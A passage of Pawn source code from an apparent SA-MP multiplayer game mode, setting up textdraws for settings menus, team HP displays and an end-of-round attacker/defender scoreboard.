	TextDrawBackgroundColor(RoundsPlayed,MAIN_BACKGROUND_COLOUR);
	TextDrawColor(RoundsPlayed, 16711935);
	TextDrawSetOutline(RoundsPlayed, 1);
	TextDrawSetProportional(RoundsPlayed, 1);
	TextDrawSetShadow(RoundsPlayed,0);
	TextDrawTextSize(RoundsPlayed, 20, 100);
	TextDrawSetSelectable(RoundsPlayed, 1);

    TeamScoreText = TextDrawCreate(557.000000, 100.000000,"_");
	TextDrawFont(TeamScoreText, 1);
	TextDrawLetterSize(TeamScoreText, 0.330000, 1.650000);
	TextDrawBackgroundColor(TeamScoreText,MAIN_BACKGROUND_COLOUR);
	TextDrawColor(TeamScoreText,-65281);
	TextDrawSetOutline(TeamScoreText, 1);
    TextDrawSetProportional(TeamScoreText, 1);
    TextDrawAlignment(TeamScoreText,2);
    TextDrawSetShadow(TeamScoreText,0);
	TextDrawTextSize(TeamScoreText, 20, 200);
	TextDrawSetSelectable(TeamScoreText, 1);
	
	SettingBox = TextDrawCreate(125.000000, 282.500000, "~n~~n~~n~~n~~n~");
	TextDrawAlignment(SettingBox, 2);
	TextDrawFont(SettingBox, 1);
	TextDrawLetterSize(SettingBox, 0.31, 1.45);
	TextDrawBackgroundColor(SettingBox,0xDDDDDD55);
	TextDrawColor(SettingBox, 16711935);
	TextDrawSetOutline(SettingBox, 1);
	TextDrawSetProportional(SettingBox, 1);
	TextDrawSetShadow(SettingBox,0);
	TextDrawTextSize(SettingBox, 20, 120);
	TextDrawUseBox(SettingBox, 1);
	TextDrawBoxColor(SettingBox, 0x00000033);

	WarModeText = TextDrawCreate(125.000000, 285.000000, sprintf("%sWar\tMode:\t~r~OFF", MAIN_TEXT_COLOUR));
	TextDrawAlignment(WarModeText, 2);
	TextDrawFont(WarModeText, 1);
	TextDrawLetterSize(WarModeText, 0.31, 1.45);
	TextDrawBackgroundColor(WarModeText,MAIN_BACKGROUND_COLOUR);
	TextDrawColor(WarModeText, 16711935);
	TextDrawSetOutline(WarModeText, 1);
	TextDrawSetProportional(WarModeText, 1);
	TextDrawSetShadow(WarModeText,0);
	TextDrawTextSize(WarModeText, 20, 150);
	TextDrawSetSelectable(WarModeText, 1);

	WeaponLimitTD = TextDrawCreate(125.000000, 300.000000, sprintf("%sWeapon\tLimit", MAIN_TEXT_COLOUR));
	TextDrawAlignment(WeaponLimitTD, 2);
	TextDrawFont(WeaponLimitTD, 1);
	TextDrawLetterSize(WeaponLimitTD, 0.31, 1.45);
	TextDrawBackgroundColor(WeaponLimitTD,MAIN_BACKGROUND_COLOUR);
	TextDrawColor(WeaponLimitTD, 16711935);
	TextDrawSetOutline(WeaponLimitTD, 1);
	TextDrawSetProportional(WeaponLimitTD, 1);
	TextDrawSetShadow(WeaponLimitTD,0);
	TextDrawTextSize(WeaponLimitTD, 20, 150);
	TextDrawSetSelectable(WeaponLimitTD, 1);

	LockServerTD = TextDrawCreate(125.000000, 315.000000, sprintf("%sServer:\t~r~Unlocked", MAIN_TEXT_COLOUR));
	TextDrawAlignment(LockServerTD, 2);
	TextDrawFont(LockServerTD, 1);
	TextDrawLetterSize(LockServerTD, 0.31, 1.45);
	TextDrawBackgroundColor(LockServerTD,MAIN_BACKGROUND_COLOUR);
	TextDrawColor(LockServerTD, 16711935);
	TextDrawSetOutline(LockServerTD, 1);
	TextDrawSetProportional(LockServerTD, 1);
	TextDrawSetShadow(LockServerTD,0);
	TextDrawTextSize(LockServerTD, 30, 200);
	TextDrawSetSelectable(LockServerTD, 1);

	CloseText = TextDrawCreate(125.000000, 330.000000, sprintf("%sClose Settings", MAIN_TEXT_COLOUR));
	TextDrawAlignment(CloseText, 2);
	TextDrawFont(CloseText, 1);
	TextDrawLetterSize(CloseText, 0.31, 1.45);
	TextDrawBackgroundColor(CloseText,MAIN_BACKGROUND_COLOUR);
	TextDrawColor(CloseText, 16711935);
	TextDrawSetOutline(CloseText, 1);
	TextDrawSetProportional(CloseText, 1);
	TextDrawSetShadow(CloseText,0);
	TextDrawTextSize(CloseText, 30, 200);
	TextDrawSetSelectable(CloseText, 1);

//  - End Round TextDraw -


	EN_AttackerBox = TextDrawCreate(178.500000 + ATTACKER_CHANGES_X, 176.00000 + ATTACKER_CHANGES_Y, "~n~~n~~n~~n~~n~~n~~n~~n~~n~~n~~n~");
	TextDrawAlignment(EN_AttackerBox, 2);
	TextDrawFont(EN_AttackerBox, 1);
	TextDrawLetterSize(EN_AttackerBox, 0.31, 1.45);
	TextDrawBackgroundColor(EN_AttackerBox,0xFF444444);
	TextDrawColor(EN_AttackerBox, 16711935);
	TextDrawSetOutline(EN_AttackerBox, 1);
	TextDrawSetProportional(EN_AttackerBox, 1);
	TextDrawSetShadow(EN_AttackerBox,0);
	TextDrawTextSize(EN_AttackerBox, 20, 180);
	TextDrawUseBox(EN_AttackerBox, 1);
	TextDrawBoxColor(EN_AttackerBox, 0xFF444444);

	EN_DefenderBox = TextDrawCreate(460.000000 + DEFENDER_CHANGES_X, 176.00000 + DEFENDER_CHANGES_Y, "~n~~n~~n~~n~~n~~n~~n~~n~~n~~n~~n~");
	TextDrawAlignment(EN_DefenderBox, 2);
	TextDrawFont(EN_DefenderBox, 1);
	TextDrawLetterSize(EN_DefenderBox, 0.31, 1.45);
	TextDrawBackgroundColor(EN_DefenderBox,0x3388FF44);
	TextDrawColor(EN_DefenderBox, 16711935);
	TextDrawSetOutline(EN_DefenderBox, 1);
	TextDrawSetProportional(EN_DefenderBox, 1);
	TextDrawSetShadow(EN_DefenderBox,0);
	TextDrawTextSize(EN_DefenderBox, 20, 180); //20, 220
	TextDrawUseBox(EN_DefenderBox, 1);
	TextDrawBoxColor(EN_DefenderBox, 0x3388FF44);

    RoundTextdrawsCreate();
    
	ResultTextdrawsCreate();
	
	EN_CheckPoint = TextDrawCreate(182.000000, 280.000000, "_");
	TextDrawAlignment(EN_CheckPoint, 1);
	TextDrawBackgroundColor(EN_CheckPoint, MAIN_BACKGROUND_COLOUR);
	TextDrawFont(EN_CheckPoint, 1);
	TextDrawLetterSize(EN_CheckPoint, 0.230000, 1.000000);
	TextDrawColor(EN_CheckPoint, -1);
	TextDrawSetOutline(EN_CheckPoint, 1);
	TextDrawSetProportional(EN_CheckPoint, 1);

//  - End of Round Textdraw -

	AttHpLose = TextDrawCreate(10.000000, 436.000000, "_");
	TextDrawBackgroundColor(AttHpLose, -16777131);
	TextDrawFont(AttHpLose, 2);
	TextDrawLetterSize(AttHpLose, 0.160000, 1.060000);
	TextDrawColor(AttHpLose, 0x222222FF);
	TextDrawSetOutline(AttHpLose, 1);
	TextDrawSetProportional(AttHpLose, 1);
	TextDrawAlignment(AttHpLose,1);
	TextDrawSetShadow(AttHpLose, 0);

	DefHpLose = TextDrawCreate(630.000000, 436.000000, "_");
	TextDrawBackgroundColor(DefHpLose, 0x3278FF33);
	TextDrawFont(DefHpLose, 2);
	TextDrawLetterSize(DefHpLose, 0.160000, 1.060000);
	TextDrawColor(DefHpLose, 0x222222FF);
	TextDrawSetOutline(DefHpLose, 1);
	TextDrawSetProportional(DefHpLose, 1);
	TextDrawAlignment(DefHpLose,3);
	TextDrawSetShadow(DefHpLose, 0);

	TeamHpLose[0] = TextDrawCreate(170.000000, 390.000000, "_");
	TextDrawAlignment(TeamHpLose[0], 2);
	TextDrawFont(TeamHpLose[0], 2);
	TextDrawLetterSize(TeamHpLose[0], 0.50000, 2.00000);
	TextDrawBackgroundColor(TeamHpLose[0],MAIN_BACKGROUND_COLOUR);
	TextDrawColor(TeamHpLose[0], 0x222222FF);
	TextDrawSetOutline(TeamHpLose[0], 1);
	TextDrawSetProportional(TeamHpLose[0], 1);
	TextDrawSetShadow(TeamHpLose[0],0);

	TeamHpLose[1] = TextDrawCreate(450.000000, 390.000000, "_");
	TextDrawAlignment(TeamHpLose[1], 2);
	TextDrawFont(TeamHpLose[1], 2);
	TextDrawLetterSize(TeamHpLose[1], 0.50000, 2.00000);
	TextDrawBackgroundColor(TeamHpLose[1],MAIN_BACKGROUND_COLOUR);
	TextDrawColor(TeamHpLose[1], 0x222222FF);
	TextDrawSetOutline(TeamHpLose[1], 1);
	TextDrawSetProportional(TeamHpLose[1], 1);
	TextDrawSetShadow(TeamHpLose[1], 0);
	
    AttackerTeam[0] = TextDrawCreate(634.000000, 370.000000, "_");
	TextDrawBackgroundColor(AttackerTeam[0], MAIN_BACKGROUND_COLOUR);
	TextDrawFont(AttackerTeam[0], 1);
	TextDrawLetterSize(AttackerTeam[0], 0.200000, 1.00000);
	TextDrawColor(AttackerTeam[0], 0xFF0000FF);
	TextDrawSetOutline(AttackerTeam[0], 1);
	TextDrawAlignment(AttackerTeam[0], 3);
	TextDrawSetShadow(AttackerTeam[0], 0);
	
	AttackerTeam[1] = TextDrawCreate(634.000000, 397.000000, "_");
	TextDrawBackgroundColor(AttackerTeam[1], MAIN_BACKGROUND_COLOUR);
	TextDrawFont(AttackerTeam[1], 1);
	TextDrawLetterSize(AttackerTeam[1], 0.200000, 1.00000);
	TextDrawColor(AttackerTeam[1], 0xFF0000FF);
	TextDrawSetOutline(AttackerTeam[1], 1);
	TextDrawAlignment(AttackerTeam[1], 3);
	TextDrawSetShadow(AttackerTeam[1], 0);
	
	AttackerTeam[2] = TextDrawCreate(2.000000, 370.000000, "_");
	TextDrawBackgroundColor(AttackerTeam[2], MAIN_BACKGROUND_COLOUR);
	TextDrawFont(AttackerTeam[2], 1);
	TextDrawLetterSize(AttackerTeam[2], 0.200000, 1.00000);
	TextDrawColor(AttackerTeam[2], 0xFF0000FF);
	TextDrawSetOutline(AttackerTeam[2], 1);
	TextDrawAlignment(AttackerTeam[2], 1);
	TextDrawSetShadow(AttackerTeam[2], 0);

	AttackerTeam[3] = TextDrawCreate(2.000000, 397.000000, "_");
	TextDrawBackgroundColor(AttackerTeam[3], MAIN_BACKGROUND_COLOUR);
	TextDrawFont(AttackerTeam[3], 1);
	TextDrawLetterSize(AttackerTeam[3], 0.200000, 1.00000);
	TextDrawColor(AttackerTeam[3], 0xFF0000FF);
	TextDrawSetOutline(AttackerTeam[3], 1);
	TextDrawAlignment(AttackerTeam[3], 1);
	TextDrawSetShadow(AttackerTeam[3], 0);
	
	DefenderTeam[0] = TextDrawCreate(634.000000, 370.000000, "_");
	TextDrawBackgroundColor(DefenderTeam[0], MAIN_BACKGROUND_COLOUR);
	TextDrawFont(DefenderTeam[0], 1);
	TextDrawLetterSize(DefenderTeam[0], 0.200000, 1.00000);
	TextDrawColor(DefenderTeam[0], 0xFF0000FF);
	TextDrawSetOutline(DefenderTeam[0], 1);
	TextDrawAlignment(DefenderTeam[0], 3);
	TextDrawSetShadow(DefenderTeam[0], 0);
	
	DefenderTeam[1] = TextDrawCreate(634.000000, 397.000000, "_");
	TextDrawBackgroundColor(DefenderTeam[1], MAIN_BACKGROUND_COLOUR);
	TextDrawFont(DefenderTeam[1], 1);
	TextDrawLetterSize(DefenderTeam[1], 0.200000, 1.00000);
	TextDrawColor(DefenderTeam[1], 0xFF0000FF);
	TextDrawSetOutline(DefenderTeam[1], 1);
	TextDrawAlignment(DefenderTeam[1], 3);
	TextDrawSetShadow(DefenderTeam[1], 0);
	
	DefenderTeam[2] = TextDrawCreate(2.000000, 370.000000, "_");
	TextDrawBackgroundColor(DefenderTeam[2], MAIN_BACKGROUND_COLOUR);
	TextDrawFont(DefenderTeam[2], 1);
	TextDrawLetterSize(DefenderTeam[2], 0.200000, 1.00000);
	TextDrawColor(DefenderTeam[2], 0xFF0000FF);
	TextDrawSetOutline(DefenderTeam[2], 1);
	TextDrawAlignment(DefenderTeam[2], 1);
	TextDrawSetShadow(DefenderTeam[2], 0);
	
	DefenderTeam[3] = TextDrawCreate(2.000000, 397.000000, "_");
	TextDrawBackgroundColor(DefenderTeam[3], MAIN_BACKGROUND_COLOUR);
	TextDrawFont(DefenderTeam[3], 1);
	TextDrawLetterSize(DefenderTeam[3], 0.200000, 1.00000);
	TextDrawColor(DefenderTeam[3], 0xFF0000FF);
	TextDrawSetOutline(DefenderTeam[3], 1);
	TextDrawAlignment(DefenderTeam[3], 1);
	TextDrawSetShadow(DefenderTeam[3], 0);
	return 1;
}


ResultTextdrawsCreate()
{
	leftBG =	TextDrawCreate	(	301.200103, 	160.775039, 	"_"			);
	TextDrawLetterSize			(	leftBG, 		0.000000, 		19.997976	);
	TextDrawTextSize			(	leftBG, 		123.411689, 	0.000000	);
	TextDrawAlignment			(	leftBG, 		1							);
	TextDrawColor				(	leftBG, 		0							);
	TextDrawUseBox				(	leftBG, 		true						);
	TextDrawBoxColor			(	leftBG, 		85							);
	TextDrawSetShadow			(	leftBG, 		0		);
	TextDrawSetOutline			(	leftBG, 		0);
	TextDrawFont				(	leftBG, 		0);

	rightBG = 	TextDrawCreate	(	478.729431, 	161.000000, 	"_"			);
	TextDrawLetterSize			(	rightBG, 		0.000000, 		19.974430	);
	TextDrawTextSize			(	rightBG, 		300.964538, 	0.000000	);
	TextDrawAlignment			(	rightBG, 		1							);
	TextDrawColor				(	rightBG, 		0							);
	TextDrawUseBox				(	rightBG, 		true						);
	TextDrawBoxColor			(	rightBG,		85							);
	TextDrawSetShadow			(	rightBG,		0							);
	TextDrawSetOutline			(	rightBG, 		0							);
	TextDrawFont				(	rightBG, 		0							);

	leftUpBG = 	TextDrawCreate	(	302.658935, 	152.633422, 	"_"			);
	TextDrawLetterSize			(	leftUpBG, 		0.000000, 		1.829496	);
	TextDrawTextSize            (	leftUpBG, 		121.435226, 	0.000000	);
	TextDrawAlignment          	(	leftUpBG, 		1							);
	TextDrawColor            	(	leftUpBG, 		0							);
	TextDrawUseBox            	(	leftUpBG, 		true						);
	TextDrawBoxColor            (	leftUpBG, 		51							);
	TextDrawSetShadow          	(	leftUpBG, 		0							);
	TextDrawSetOutline         	(	leftUpBG, 		0							);
	TextDrawFont            	(	leftUpBG, 		0							);

	rightUpBG = TextDrawCreate  (	480.741516, 	152.291732, 	"_"			);
	TextDrawLetterSize          (	rightUpBG, 		0.000000, 		1.815376	);
	TextDrawTextSize            (	rightUpBG, 		299.411682, 	0.000000	);
	TextDrawAlignment           (	rightUpBG, 		1							);
	TextDrawColor            	(	rightUpBG, 		0							);
	TextDrawUseBox            	(	rightUpBG, 		true						);
	TextDrawBoxColor            (	rightUpBG, 		13132595					);
	TextDrawSetShadow          	(	rightUpBG, 		0							);
	TextDrawSetOutline     	  	(	rightUpBG, 		0							);
	TextDrawFont            	(	rightUpBG, 		1							);

	leftHeader = TextDrawCreate	(	302.482940,		153.225158, 	"_"			);
	TextDrawLetterSize         	(	leftHeader, 	0.000000, 		1.711848	);
	TextDrawTextSize            (	leftHeader, 	122.211738,		0.000000	);
	TextDrawAlignment          	(	leftHeader,		1							);
	TextDrawColor            	(	leftHeader,		0							);
	TextDrawUseBox            	(	leftHeader,		true						);
	TextDrawBoxColor            (	leftHeader,		-16766891					);
	TextDrawSetShadow          	(	leftHeader,		0							);
	TextDrawSetOutline         	(	leftHeader,		0							);
	TextDrawFont            	(	leftHeader,		0							);

	rightHeader = TextDrawCreate(	480.330291,		153.233322,		"_"			);
	TextDrawLetterSize         	(	rightHeader,	0.000000,		1.707144	);
	TextDrawTextSize           	(	rightHeader,	299.905853,		0.000000	);
	TextDrawAlignment          	(	rightHeader,	1							);
	TextDrawColor            	(	rightHeader,	860159863					);
	TextDrawUseBox            	(	rightHeader,	true						);
	TextDrawBoxColor            (	rightHeader,	860159829					);
	TextDrawSetShadow          	(	rightHeader,	0							);
	TextDrawSetOutline         	(	rightHeader,	0							);
	TextDrawFont            	(	rightHeader,	0							);

	leftULine = TextDrawCreate 	(	116.105949,		169.166824,		"-"			);
	TextDrawLetterSize         	(	leftULine,		13.658081,		0.270249	);
	TextDrawAlignment          	(	leftULine,		1							);
	TextDrawColor            	(	leftULine,		-1							);
	TextDrawSetShadow          	(	leftULine,		0							);
	TextDrawSetOutline         	(	leftULine,		10							);
	TextDrawBackgroundColor    	(	leftULine,		51							);
	TextDrawFont            	(	leftULine,		1							);
	TextDrawSetProportional    	(	leftULine,		1							);

	rightULine = TextDrawCreate	(	290.376525,		169.816665,		"-"			);
	TextDrawLetterSize         	(	rightULine,		13.662071,		0.257999	);
	TextDrawAlignment          	(	rightULine,		1							);
	TextDrawColor            	(	rightULine,		-1							);
	TextDrawSetShadow          	(	rightULine,		0							);
	TextDrawSetOutline         	(	rightULine,		10							);
	TextDrawBackgroundColor    	(	rightULine,		51							);
	TextDrawFont            	(	rightULine,		1							);
	TextDrawSetProportional    	(	rightULine,		1							);

	lowerBG = TextDrawCreate   	(	460.823425,		345.199615,		"_"			);
	TextDrawLetterSize         	(	lowerBG,		0.000000,		4.986599	);
	TextDrawTextSize            (	lowerBG,		144.823318,		0.000000	);
	TextDrawAlignment          	(	lowerBG,		1							);
	TextDrawColor            	(	lowerBG,		0							);
	TextDrawUseBox            	(	lowerBG,		true						);
	TextDrawBoxColor            (	lowerBG,		102							);
	TextDrawSetShadow          	(	lowerBG,		0							);
	TextDrawSetOutline         	(	lowerBG,		0							);
	TextDrawFont            	(	lowerBG,		0							);

	leftUpText = TextDrawCreate(	128.094100,		143.499984,		"Attackers"	);
	TextDrawLetterSize         	(	leftUpText,		0.225058,		1.115831	);
	TextDrawAlignment          	(	leftUpText,		1							);
	TextDrawColor            	(	leftUpText,		-1							);
	TextDrawSetShadow          	(	leftUpText,		0							);
	TextDrawSetOutline         	(	leftUpText,		1							);
	TextDrawBackgroundColor    	(	leftUpText,		51							);
	TextDrawFont            	(	leftUpText,		1							);
	TextDrawSetProportional    	(	leftUpText,		1							);

	rightUpText = TextDrawCreate(	436.282226,		143.499969,		"Defenders"	);
	TextDrawLetterSize         	(	rightUpText,	0.225058,		1.115831	);
	TextDrawAlignment          	(	rightUpText,	1							);
	TextDrawColor            	(	rightUpText,	-1							);
	TextDrawSetShadow          	(	rightUpText,	0							);
	TextDrawSetOutline         	(	rightUpText,	1							);
	TextDrawBackgroundColor    	(	rightUpText,	51							);
	TextDrawFont            	(	rightUpText,	1							);
	TextDrawSetProportional    	(	rightUpText,	1							);

	topTextScore = TextDrawCreate(	302.870422,		111.824943,		"_"			);//~y~~h~TCW~n~~b~~h~~h~Ateam 9 ~w~- ~r~~h~0 Bteam
	TextDrawLetterSize         	(	topTextScore,	0.275128,		1.917916	);
	TextDrawAlignment          	(	topTextScore,	2							);
	TextDrawColor            	(	topTextScore,	-1							);
	TextDrawSetShadow          	(	topTextScore,	1							);
	TextDrawSetOutline         	(	topTextScore,	0							);
	TextDrawBackgroundColor    	(	topTextScore,	125							);
	TextDrawFont            	(	topTextScore,	2							);
	TextDrawSetProportional    	(	topTextScore,	1							);

	leftText = TextDrawCreate  	(	132.658905,		172.316802,		"Name___________________Kill__HP________Acc________Dmg");
	TextDrawLetterSize         	(	leftText,		0.184588,		0.946666	);
	TextDrawAlignment          	(	leftText,		1							);
	TextDrawColor          		(	leftText,		-1							);
	TextDrawSetShadow          	(	leftText,		0							);
	TextDrawSetOutline         	(	leftText,		1							);
	TextDrawBackgroundColor     (	leftText,		0xFF003333					);
	TextDrawFont            	(	leftText,		1							);
	TextDrawSetProportional    	(	leftText,		1							);

	rightText = TextDrawCreate 	(	310.459045,		172.850051,		"Name___________________Kill__HP________Acc________Dmg");
	TextDrawLetterSize         	(	rightText,		0.184588,		0.946666	);
	TextDrawAlignment          	(	rightText,		1							);
	TextDrawColor            	(	rightText,		-1							);
	TextDrawSetShadow           (	rightText,		0							);
	TextDrawSetOutline          (	rightText,		1							);
	TextDrawBackgroundColor    	(	rightText,		0x3344FF33					);
	TextDrawFont            	(	rightText,		1							);
	TextDrawSetProportional     (	rightText,		1							);

	lowerULine = TextDrawCreate(	129.505859,		390.541168,		"-"			);
	TextDrawLetterSize         	(	lowerULine,		24.725660,		0.309667	);
	TextDrawAlignment          	(	lowerULine,		1							);
	TextDrawColor          		(	lowerULine,		16777215					);
	TextDrawSetShadow          	(	lowerULine,		0							);
	TextDrawSetOutline         	(	lowerULine,		0							);
	TextDrawBackgroundColor    	(	lowerULine,		255							);
	TextDrawFont           		(	lowerULine,		1							);
	TextDrawSetProportional    	(	lowerULine,		1							);

	teamWonHow = TextDrawCreate	(	304.187988,		345.974914,		"_"			);
	TextDrawLetterSize         	(	teamWonHow,		0.150094,		1.030083	);
	TextDrawAlignment          	(	teamWonHow,		2							);
	TextDrawColor          		(	teamWonHow,		-1							);
	TextDrawSetShadow          	(	teamWonHow,		0							);
	TextDrawSetOutline         	(	teamWonHow,		1							);
	TextDrawBackgroundColor    	(	teamWonHow,		30							);
	TextDrawFont            	(	teamWonHow,		2							);
	TextDrawSetProportional    	(	teamWonHow,		1							);

	leftTop = TextDrawCreate   	(	300.694656,		362.025115,		"_"			);
	TextDrawLetterSize         	(	leftTop,		0.18,			0.9			);
	TextDrawAlignment          	(	leftTop,		2							);
	TextDrawColor            	(	leftTop,		-1264229146					);
	TextDrawSetShadow          	(	leftTop,		0							);
	TextDrawSetOutline         	(	leftTop,		1							);
	TextDrawBackgroundColor    	(	leftTop,		51							);
	TextDrawFont            	(	leftTop,		1							);
	TextDrawSetProportional    	(	leftTop,		1							);
	TextDrawSetSelectable      	(	leftTop,		true						);

/*	rightTop = TextDrawCreate  	(	324.341369,		361.625335,		"_"			);
	TextDrawLetterSize         	(	rightTop,		0.155647,		0.937916	);
	TextDrawAlignment          	(	rightTop,		1							);
	TextDrawColor            	(	rightTop,		-1264229151					);
	TextDrawSetShadow          	(	rightTop,		0							);
	TextDrawSetOutline         	(	rightTop,		1							);
	TextDrawBackgroundColor    	(	rightTop,		40							);
	TextDrawFont           		(	rightTop,		1							);
	TextDrawSetProportional    	(	rightTop,		1							);
*/
	//left content
	leftNames = TextDrawCreate	(	132.035293,		182.650009,		"_"			);
	TextDrawLetterSize         	(	leftNames,		0.194799,		0.942583	);
	TextDrawAlignment          	(	leftNames,		1							);
	TextDrawColor            	(	leftNames,		-1							);
	TextDrawSetShadow          	(	leftNames,		0							);
	TextDrawSetOutline         	(	leftNames,		1							);
	TextDrawBackgroundColor    	(	leftNames,		0xFF003322					);
	TextDrawFont           		(	leftNames,		1							);
	TextDrawSetProportional    	(	leftNames,		1							);
	//left content
	leftKills = TextDrawCreate	(	223.035293,		182.650009,		"_"			);
	TextDrawLetterSize         	(	leftKills,		0.194799,		0.942583	);
	TextDrawAlignment          	(	leftKills,		2							);
	TextDrawColor            	(	leftKills,		-1							);
	TextDrawSetShadow          	(	leftKills,		0							);
	TextDrawSetOutline         	(	leftKills,		1							);
	TextDrawBackgroundColor    	(	leftKills,		0xFF003322					);
	TextDrawFont           		(	leftKills,		1							);
	TextDrawSetProportional    	(	leftKills,		1							);
	//left content
	leftHP = TextDrawCreate		(	243.035293,		182.650009,		"_"			);
	TextDrawLetterSize         	(	leftHP,			0.194799,		0.942583	);
	TextDrawAlignment          	(	leftHP,			2							);
	TextDrawColor            	(	leftHP,			-1							);
	TextDrawSetShadow          	(	leftHP,			0							);
	TextDrawSetOutline         	(	leftHP,			1							);
	TextDrawBackgroundColor    	(	leftHP,			0xFF003322					);
	TextDrawFont           		(	leftHP,			1							);
	TextDrawSetProportional    	(	leftHP,			1							);

	//left content for End MATCH (WAR)
	leftDeaths = TextDrawCreate		(	236.035293,		182.650009,		"_"			);
	TextDrawLetterSize         	(	leftDeaths,			0.194799,		0.942583	);
	TextDrawAlignment          	(	leftDeaths,			2							);
	TextDrawColor            	(	leftDeaths,			-1							);
	TextDrawSetShadow          	(	leftDeaths,			0							);
	TextDrawSetOutline         	(	leftDeaths,			1							);
	TextDrawBackgroundColor    	(	leftDeaths,			0xFF003322					);
	TextDrawFont           		(	leftDeaths,			1							);
	TextDrawSetProportional    	(	leftDeaths,			1							);

	//left content
	leftAcc = TextDrawCreate	(	265.035293,		182.650009,		"_"			);
	TextDrawLetterSize         	(	leftAcc,		0.194799,		0.942583	);
	TextDrawAlignment          	(	leftAcc,		2							);
	TextDrawColor            	(	leftAcc,		-1							);
	TextDrawSetShadow          	(	leftAcc,		0							);
	TextDrawSetOutline         	(	leftAcc,		1							);
	TextDrawBackgroundColor    	(	leftAcc,		0xFF003322					);
	TextDrawFont           		(	leftAcc,		1							);
	TextDrawSetProportional    	(	leftAcc,		1							);
	//left content
	leftDmg = TextDrawCreate	(	285.035293,		182.650009,		"_"			);
	TextDrawLetterSize         	(	leftDmg,		0.194799,		0.942583	);
	TextDrawAlignment          	(	leftDmg,		2							);
	TextDrawColor            	(	leftDmg,		-1							);
	TextDrawSetShadow          	(	leftDmg,		0							);
	TextDrawSetOutline         	(	leftDmg,		1							);
	TextDrawBackgroundColor    	(	leftDmg,		0xFF003322					);
	TextDrawFont           		(	leftDmg,		1							);
	TextDrawSetProportional    	(	leftDmg,		1							);
	//left content
	leftPlayed = TextDrawCreate	(	248.035293,		182.650009,		"_"			);
	TextDrawLetterSize         	(	leftPlayed,		0.194799,		0.942583	);
	TextDrawAlignment          	(	leftPlayed,		2							);
	TextDrawColor            	(	leftPlayed,		-1							);
	TextDrawSetShadow          	(	leftPlayed,		0							);
	TextDrawSetOutline         	(	leftPlayed,		1							);
	TextDrawBackgroundColor    	(	leftPlayed,		0xFF003322					);
	TextDrawFont           		(	leftPlayed,		1							);
	TextDrawSetProportional    	(	leftPlayed,		1							);
    //left content

	//right content
	rightNames = TextDrawCreate	(	310.035293,		182.650009,		"_"			);
	TextDrawLetterSize         	(	rightNames,		0.194799,		0.942583	);
	TextDrawAlignment          	(	rightNames,		1							);
	TextDrawColor          		(	rightNames,		-1							);
	TextDrawSetShadow          	(	rightNames,		0							);
	TextDrawSetOutline         	(	rightNames,		1							);
	TextDrawBackgroundColor    	(	rightNames,		0x3344FF22					);
	TextDrawFont            	(	rightNames,		1							);
	TextDrawSetProportional    	(	rightNames,		1							);
	//right content
	rightKills = TextDrawCreate(	400.535293,		182.650009,		"_"			);
	TextDrawLetterSize         	(	rightKills,		0.194799,		0.942583	);
	TextDrawAlignment          	(	rightKills,		2							);
	TextDrawColor          		(	rightKills,		-1							);
	TextDrawSetShadow          	(	rightKills,		0							);
	TextDrawSetOutline         	(	rightKills,		1							);
	TextDrawBackgroundColor    	(	rightKills,		0x3344FF22					);
	TextDrawFont            	(	rightKills,		1							);
	TextDrawSetProportional    	(	rightKills,		1							);
    //right content
	rightHP = TextDrawCreate	(	421.035293,		182.650009,		"_"			);
	TextDrawLetterSize         	(	rightHP,		0.194799,		0.942583	);
	TextDrawAlignment          	(	rightHP,		2							);
	TextDrawColor          		(	rightHP,		-1							);
	TextDrawSetShadow          	(	rightHP,		0							);
	TextDrawSetOutline         	(	rightHP,		1							);
	TextDrawBackgroundColor    	(	rightHP,		0x3344FF22					);
	TextDrawFont            	(	rightHP,		1							);
	TextDrawSetProportional    	(	rightHP,		1							);

	//right content for End MATCH (WAR)
	rightDeaths = TextDrawCreate	(	414.035293,		182.650009,		"_"			);
	TextDrawLetterSize         	(	rightDeaths,		0.194799,		0.942583	);
	TextDrawAlignment          	(	rightDeaths,		2							);
	TextDrawColor          		(	rightDeaths,		-1							);
	TextDrawSetShadow          	(	rightDeaths,		0							);
	TextDrawSetOutline         	(	rightDeaths,		1							);
	TextDrawBackgroundColor    	(	rightDeaths,		0x3344FF22					);
	TextDrawFont            	(	rightDeaths,		1							);
	TextDrawSetProportional    	(	rightDeaths,		1							);

	//right content
	rightAcc = TextDrawCreate	(	443.035293,		182.650009,		"_"			);
	TextDrawLetterSize         	(	rightAcc,		0.194799,		0.942583	);
	TextDrawAlignment          	(	rightAcc,		2							);
	TextDrawColor          		(	rightAcc,		-1							);
	TextDrawSetShadow          	(	rightAcc,		0							);
	TextDrawSetOutline         	(	rightAcc,		1							);
	TextDrawBackgroundColor    	(	rightAcc,		0x3344FF22					);
	TextDrawFont            	(	rightAcc,		1							);
	TextDrawSetProportional    	(	rightAcc,		1							);
    //right content
	rightDmg = TextDrawCreate	(	463.035293,		182.650009,		"_"			);
	TextDrawLetterSize         	(	rightDmg,		0.194799,		0.942583	);
	TextDrawAlignment          	(	rightDmg,		2							);
	TextDrawColor          		(	rightDmg,		-1							);
	TextDrawSetShadow          	(	rightDmg,		0							);
	TextDrawSetOutline         	(	rightDmg,		1							);
	TextDrawBackgroundColor    	(	rightDmg,		0x3344FF22					);
	TextDrawFont            	(	rightDmg,		1							);
	TextDrawSetProportional    	(	rightDmg,		1							);
    //right content
	rightPlayed = TextDrawCreate(	426.035293,		182.650009,		"_"			);
	TextDrawLetterSize         	(	rightPlayed,	0.194799,		0.942583	);
	TextDrawAlignment          	(	rightPlayed,	2							);
	TextDrawColor          		(	rightPlayed,	-1							);
	TextDrawSetShadow          	(	rightPlayed,	0							);
	TextDrawSetOutline         	(	rightPlayed,	1							);
	TextDrawBackgroundColor    	(	rightPlayed,	0x3344FF22					);
	TextDrawFont            	(	rightPlayed,	1							);
	TextDrawSetProportional    	(	rightPlayed,	1							);
    //right content
}


//===

ShowRoundStats(playerid)
{
    HideRoundStats(playerid);

	TextDrawColor( leftRedBG , 0xDE000066 );
	TextDrawColor( rightBlueBG , 0x3344FF66 );

	TextDrawShowForPlayer(playerid,centerblackBG);
	TextDrawShowForPlayer(playerid,fullBox3D);
	TextDrawShowForPlayer(playerid,leftRedBG);
	TextDrawShowForPlayer(playerid,rightBlueBG);
	TextDrawShowForPlayer(playerid,timerCenterTD);
	TextDrawShowForPlayer(playerid,leftTeamData);
	TextDrawShowForPlayer(playerid,rightTeamData);
	TextDrawShowForPlayer(playerid,centerTeamNames);
}

HideRoundStats(playerid)
{
	TextDrawHideForPlayer(playerid,centerblackBG);
	TextDrawHideForPlayer(playerid,fullBox3D);
	TextDrawHideForPlayer(playerid,leftRedBG);
